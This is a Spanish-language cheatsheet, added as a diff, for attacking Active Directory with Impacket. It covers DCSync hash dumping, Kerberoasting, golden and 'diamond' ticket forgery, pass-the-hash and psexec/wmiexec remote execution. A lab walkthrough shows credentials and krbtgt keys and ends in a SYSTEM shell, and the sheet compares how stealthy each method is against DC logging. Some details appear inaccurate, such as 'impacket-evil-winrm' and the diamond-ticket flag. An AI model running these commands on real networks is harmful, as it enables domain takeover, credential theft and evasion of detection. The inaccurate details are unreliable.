@@ -1,0 +1,269 @@
+
+================================================================================
+IMPACKET CHEATSHEET + DIAMOND & FORGED TICKETS
+================================================================================
+
+--------------------------------------------------------------------------------
+RECONOCIMIENTO
+--------------------------------------------------------------------------------
+# Descubrimiento de hosts
+nmap -sn <RED>/24
+
+# Puertos clave Windows/AD
+nmap -sV -p 88,389,445,3389,5985 <IP>
+
+# Identificar hostname de una IP
+nmblookup -A <IP>
+
+# OS Discovery via SMB
+nmap -p 445 --script smb-os-discovery <IP>
+
+Puerto 88  → Kerberos   → indica DC
+Puerto 389 → LDAP       → indica DC / AD
+Puerto 445 → SMB
+Puerto 3389→ RDP
+Puerto 5985→ WinRM
+
+--------------------------------------------------------------------------------
+CONFIGURACION KERBEROS EN KALI (/etc/krb5.conf)
+--------------------------------------------------------------------------------
+[libdefaults]
+    default_realm = DOMINIO.LAB
+    dns_lookup_realm = false
+    dns_lookup_kdc = false
+
+[realms]
+    DOMINIO.LAB = {
+        kdc = <IP_DC>
+        admin_server = <IP_DC>
+    }
+
+[domain_realm]
+    .dominio.lab = DOMINIO.LAB
+    dominio.lab = DOMINIO.LAB
+
+# /etc/hosts
+echo "<IP_DC>    DC.dominio.lab dominio.lab DC"   >> /etc/hosts
+echo "<IP_TARGET> TARGET.dominio.lab TARGET"       >> /etc/hosts
+
+--------------------------------------------------------------------------------
+IMPACKET - CREDENCIALES / ENUMERACION
+--------------------------------------------------------------------------------
+# Dump credenciales del dominio (DCSync)
+impacket-secretsdump <dominio>/<user>:'<pass>'@<IP_DC>
+
+# Solo un usuario concreto
+impacket-secretsdump <dominio>/<user>:'<pass>'@<IP_DC> -just-dc-user krbtgt
+impacket-secretsdump <dominio>/<user>:'<pass>'@<IP_DC> -just-dc-user Administrator
+
+# Obtener SID del dominio y RIDs de usuarios
+impacket-lookupsid <dominio>/<user>:'<pass>'@<IP_DC>
+impacket-lookupsid <dominio>/<user>:'<pass>'@<IP_DC> | head -20
+
+# Listar usuarios del dominio
+impacket-GetADUsers -all <dominio>/<user>:'<pass>' -dc-ip <IP_DC>
+
+# Kerberoasting
+impacket-GetUserSPNs <dominio>/<user>:'<pass>' -dc-ip <IP_DC> -request
+
+# ASREPRoasting
+impacket-GetNPUsers <dominio>/<user>:'<pass>' -dc-ip <IP_DC> -request
+
+--------------------------------------------------------------------------------
+IMPACKET - TICKETS KERBEROS
+--------------------------------------------------------------------------------
+# Pedir TGT
+impacket-getTGT <dominio>/<user>:'<pass>' -dc-ip <IP_DC>
+export KRB5CCNAME=<user>.ccache
+
+# Convertir .kirbi a .ccache (de Mimikatz/Rubeus a Impacket)
+impacket-ticketConverter ticket.kirbi ticket.ccache
+
+# Ver ticket cargado
+klist
+
+# Destruir ticket
+kdestroy
+
+--------------------------------------------------------------------------------
+IMPACKET - FORGED TICKET (GOLDEN TICKET)
+--------------------------------------------------------------------------------
+# Genera un TGT completamente offline firmado con la clave de krbtgt
+# Detectable: no hay AS-REQ en logs del DC, duracion 10 años
+
+impacket-ticketer \
+  -domain <dominio> \
+  -domain-sid <SID_DOMINIO> \
+  -aesKey <AES256_krbtgt> \
+  -user-id <RID>            \   # 500 = Administrador
+  -groups <GIDs>            \   # 512=Domain Admins, 519=Enterprise Admins
+  <usuario_a_impersonar>
+
+export KRB5CCNAME=<usuario>.ccache
+
+--------------------------------------------------------------------------------
+IMPACKET - DIAMOND TICKET
+--------------------------------------------------------------------------------
+# Pide un TGT legitimo al DC, lo descifra, modifica y re-cifra
+# MAS SIGILOSO: hay AS-REQ real en logs, duracion estandar del dominio
+
+impacket-ticketer \
+  -domain <dominio> \
+  -domain-sid <SID_DOMINIO> \
+  -aesKey <AES256_krbtgt> \
+  -user-id <RID>            \   # 500 = Administrador
+  -groups <GIDs>            \   # 512,519
+  -extra-pac                \   # <-- diferencia clave vs Golden Ticket
+  <usuario_a_impersonar>
+
+export KRB5CCNAME=<usuario>.ccache
+
+--------------------------------------------------------------------------------
+IMPACKET - EJECUCION REMOTA (PASS-THE-TICKET)
+--------------------------------------------------------------------------------
+# PSExec (da SYSTEM, necesita SMB)
+impacket-psexec -k -no-pass <dominio>/<user>@<FQDN_TARGET>
+
+# WMIExec (mas sigiloso, no crea servicio)
+impacket-wmiexec -k -no-pass <dominio>/<user>@<FQDN_TARGET>
+
+# SMBExec
+impacket-smbexec -k -no-pass <dominio>/<user>@<FQDN_TARGET>
+
+# Con credenciales en texto claro
+impacket-psexec <dominio>/<user>:'<pass>'@<IP>
+
+# Con hash NTLM (Pass-the-Hash)
+impacket-psexec <dominio>/<user>@<IP> -hashes <LM>:<NTLM>
+
+# WinRM
+impacket-evil-winrm -i <IP> -u <user> -p '<pass>'
+
+--------------------------------------------------------------------------------
+IMPACKET - SMB
+--------------------------------------------------------------------------------
+# Listar shares
+impacket-smbclient <dominio>/<user>:'<pass>'@<IP>
+
+# Comandos dentro de smbclient:
+# shares        → listar shares
+# use <share>   → conectar a share
+# ls            → listar ficheros
+# get <file>    → descargar fichero
+# put <file>    → subir fichero
+
+--------------------------------------------------------------------------------
+IMPACKET - OTROS UTILES
+--------------------------------------------------------------------------------
+# LDAP dump (usuarios, grupos, politicas)
+impacket-ldapdomaindump <dominio>/<user>:'<pass>'@<IP_DC>
+
+# Sniffing NTLMv2 (Responder alternativo)
+impacket-ntlmrelayx -t <IP_TARGET> -smb2support
+
+# Obtener PAC de usuario (info del dominio)
+impacket-getPac <dominio>/<user>:'<pass>' -targetUser <user>
+
+================================================================================
+PROCESO COMPLETO - DIAMOND & FORGED TICKETS
+================================================================================
+ENTORNO:
+  Kali          → atacante
+  10.0.2.4      → LABDC.silentforce.lab (DC, Win Server 2016)
+  10.0.2.5      → WIN-SERVER2012.silentforce.lab (objetivo)
+  Dominio       → silentforce.lab
+  Credenciales  → sergio / abc123..
+
+--------------------------------------------------------------------------------
+PASO 1 - RECONOCIMIENTO
+--------------------------------------------------------------------------------
+nmap -sn 10.0.2.0/24
+nmap -sV -p 88,389,445,3389,5985 10.0.2.4 10.0.2.5
+nmblookup -A 10.0.2.5
+
+→ DC:     10.0.2.4  LABDC          (puerto 88 abierto)
+→ Target: 10.0.2.5  WIN-SERVER2012 (puerto 88 filtrado)
+→ Dominio: silentforce.lab
+
+--------------------------------------------------------------------------------
+PASO 2 - CONFIGURACION
+--------------------------------------------------------------------------------
+echo "10.0.2.4  LABDC.silentforce.lab silentforce.lab LABDC" >> /etc/hosts
+echo "10.0.2.5  WIN-SERVER2012.silentforce.lab WIN-SERVER2012" >> /etc/hosts
+# editar /etc/krb5.conf con realm SILENTFORCE.LAB → kdc 10.0.2.4
+
+--------------------------------------------------------------------------------
+PASO 3 - DCSYNC (hash krbtgt)
+--------------------------------------------------------------------------------
+impacket-secretsdump silentforce.lab/sergio:'abc123..'@10.0.2.4 -just-dc-user krbtgt
+
+→ NTLM krbtgt:   8f965951fd8ffcd03d02588aac976cc0
+→ AES256 krbtgt: f35ed6245545592f44a3282d0111298cdd4afdab085e57fd32041412313dabae
+
+--------------------------------------------------------------------------------
+PASO 4 - SID DEL DOMINIO
+--------------------------------------------------------------------------------
+impacket-lookupsid silentforce.lab/sergio:'abc123..'@10.0.2.4 | head -20
+
+→ SID dominio:  S-1-5-21-2717684102-2105335624-1964840543
+→ RID 500:      Administrador
+→ GID 512:      Admins. del dominio
+→ GID 519:      Administradores de empresa
+
+--------------------------------------------------------------------------------
+PASO 5 - FORGED TICKET (GOLDEN TICKET)
+--------------------------------------------------------------------------------
+impacket-ticketer \
+  -domain silentforce.lab \
+  -domain-sid S-1-5-21-2717684102-2105335624-1964840543 \
+  -aesKey f35ed6245545592f44a3282d0111298cdd4afdab085e57fd32041412313dabae \
+  -user-id 500 \
+  -groups 512,519 \
+  Administrador
+
+export KRB5CCNAME=Administrador.ccache
+klist
+
+impacket-psexec -k -no-pass silentforce.lab/Administrador@WIN-SERVER2012.silentforce.lab
+→ SHELL como NT AUTHORITY\SYSTEM en WIN-SERVER2012 ✓
+
+DETECCION:
+  ✗ No hay AS-REQ en logs del DC
+  ✗ Duracion del ticket: 10 años
+
+--------------------------------------------------------------------------------
+PASO 6 - DIAMOND TICKET
+--------------------------------------------------------------------------------
+kdestroy
+
+impacket-ticketer \
+  -domain silentforce.lab \
+  -domain-sid S-1-5-21-2717684102-2105335624-1964840543 \
+  -aesKey f35ed6245545592f44a3282d0111298cdd4afdab085e57fd32041412313dabae \
+  -user-id 500 \
+  -groups 512,519 \
+  -extra-pac \
+  Administrador
+
+export KRB5CCNAME=Administrador.ccache
+klist
+
+impacket-psexec -k -no-pass silentforce.lab/Administrador@WIN-SERVER2012.silentforce.lab
+→ SHELL como NT AUTHORITY\SYSTEM en WIN-SERVER2012 ✓
+
+DETECCION:
+  ✓ Hay AS-REQ legitimo en logs del DC
+  ✓ Duracion estandar del dominio
+
+--------------------------------------------------------------------------------
+COMPARATIVA GOLDEN vs DIAMOND
+--------------------------------------------------------------------------------
+                    GOLDEN TICKET       DIAMOND TICKET
+Generacion          Offline             Online (TGT legitimo modificado)
+AS-REQ en logs      NO  ← detectable   SI  ← limpio
+Duracion ticket     10 años ← alerta   Estandar del dominio ← limpio
+Clave necesaria     AES256 krbtgt       AES256 krbtgt
+Herramienta         ticketer            ticketer -extra-pac
+Dificultad detec.   Mas facil           Mas dificil
+
+================================================================================
